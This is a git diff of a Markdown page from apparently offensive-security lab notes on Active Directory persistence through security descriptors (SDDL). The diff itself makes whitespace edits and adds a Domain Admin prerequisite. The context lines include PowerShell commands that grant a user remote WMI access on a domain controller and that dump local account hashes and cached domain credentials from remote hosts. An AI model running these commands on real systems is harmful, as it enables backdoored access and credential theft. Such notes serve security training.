@@ -2,7 +2,7 @@
 
 ## Format
 
-Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor.&#x20;
+Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor.
 
 {% tabs %}
 {% tab title="Syntax" %}
@@ -13,6 +13,10 @@ Security Descriptor Definition Language (SDDL) defines the format which is used 
 Detailed docs about SDDL:
 
 {% embed url="https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings" %}
+
+## Pre-reqs
+
+* Domain Admin Privs
 
 ## Exploitation
 
@@ -34,8 +38,6 @@ Apply to all namespaces
 </strong><strong># Worked if didn't get access denied 
 </strong><strong>gwmi -class win32_operatingsystem -ComputerName &#x3C;dc_machine>
 </strong></code></pre>
-
-
 
 ### WMI - PowerShell
 
@@ -61,7 +63,7 @@ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Admini
 
 # Remove
 Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
-
+
 ```
 
 PS Remoting (not stable after August 2020 patches)
@@ -90,4 +92,3 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # retrieve domain cached credentials
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-
